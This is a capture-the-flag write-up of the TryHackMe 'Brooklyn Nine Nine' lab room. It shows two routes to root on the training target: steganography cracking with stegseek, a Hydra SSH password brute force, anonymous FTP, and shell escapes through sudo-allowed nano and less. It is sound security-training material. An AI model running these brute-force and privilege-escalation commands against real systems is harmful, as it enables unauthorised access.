# CTF Write-up: Brooklyn Nine Nine
**Platform:** TryHackMe  
**Difficulty:** Easy  
**Date:** March 4, 2026  
**Author:** Yasir  
**Status:** ✅ Completed | 🏆 Both Attack Paths Found!  
**Room:** https://tryhackme.com/room/brooklynninenine

> ⚠️ **Spoiler Warning:** This write-up contains hints and methodology. Try the room yourself before reading!

---

## Overview

Brooklyn Nine Nine has **two completely different attack paths** — both leading to full root compromise. I discovered and completed both!

| Item | Details |
|------|---------|
| Target IP | 10.112.154.15 |
| Flags | 2 (user + root) |
| Attack Paths | 2 — Holt (stego) and Jake (brute force) |
| Tools | Nmap, FTP, stegseek, Hydra, SSH, GTFOBins |

---

## Step 1 — Nmap Scan

```bash
nmap -p- --min-rate 5000 -sV 10.112.154.15
```

- Port 21 — FTP (vsftpd 3.0.3)
- Port 22 — SSH (OpenSSH 7.6p1)
- Port 80 — HTTP (Apache 2.4.29)

---

## 🔵 Path 1 — Holt (Steganography)

> Web Enumeration → Steganography → SSH → sudo nano → Root

### Page Source
Viewed page source and found:
- Background image: `brooklyn99.jpg`
- HTML comment: `<!-- Have you ever heard of steganography? -->`

### Extract Hidden Data
```bash
wget http://10.112.154.15/brooklyn99.jpg
stegseek brooklyn99.jpg /usr/share/wordlists/rockyou.txt
```

stegseek cracked the passphrase and extracted a note containing Holt's password.

> 💡 **Tip:** stegseek brute-forces steganography passphrases automatically — much faster than steghide for cracking.

### SSH & Privilege Escalation (nano)
SSH'd in as holt. Checked sudo permissions:
```bash
sudo -l
# Result: (ALL) NOPASSWD: /bin/nano
```

GTFOBins nano exploit:
```bash
sudo nano
# Press Ctrl+R then Ctrl+X
# Type: reset; sh 1>&0 2>&0
# Press Enter → root shell!
```

```bash
cat /root/root.txt  # Root flag captured ✅
```

---

## 🔴 Path 2 — Jake (FTP + Brute Force)

> FTP Anonymous Login → Note Discovery → Hydra SSH → sudo less → Root

### FTP Anonymous Login
```bash
ftp 10.112.154.15
# username: anonymous | password: (blank)
```

Found `note_to_jake.txt` — Amy warning Jake his password is too weak. This gives us:
- Username: `jake`
- Hint: password is weak (rockyou.txt will work!)

### Hydra SSH Brute Force
```bash
hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.112.154.15
```

Cracked in under 2 minutes. SSH'd in as jake. Found user.txt in /home/holt.

### Privilege Escalation (less)
```bash
sudo -l
# Result: (ALL) NOPASSWD: /usr/bin/less
```

GTFOBins less exploit:
```bash
sudo less /etc/hosts
# Type: !/bin/sh → root shell!
```

```bash
cat /root/root.txt  # Root flag captured ✅
```

> 💡 **Tip:** Every user can have different sudo privileges. Always run sudo -l after gaining access as any new user.

---

## Flags

| Flag | Location | Method |
|------|----------|--------|
| 👤 User Flag | /home/holt/user.txt | Both paths |
| 👑 Root Flag | /root/root.txt | Both paths |

---

## What I Learned

- HTML comments contain hints — always read page source
- stegseek brute-forces steganography passphrases automatically
- FTP notes can reveal usernames and password hints
- Each user has different sudo privileges — check sudo -l for every user
- nano GTFOBins: Ctrl+R → Ctrl+X → shell command
- less GTFOBins: !/bin/sh spawns a root shell
- Multiple attack paths exist — thorough enumeration finds them all

---

*Write-up by Yasir | TryHackMe Junior Penetration Tester Path*  
*Room: [Brooklyn Nine Nine](https://tryhackme.com/room/brooklynninenine)*
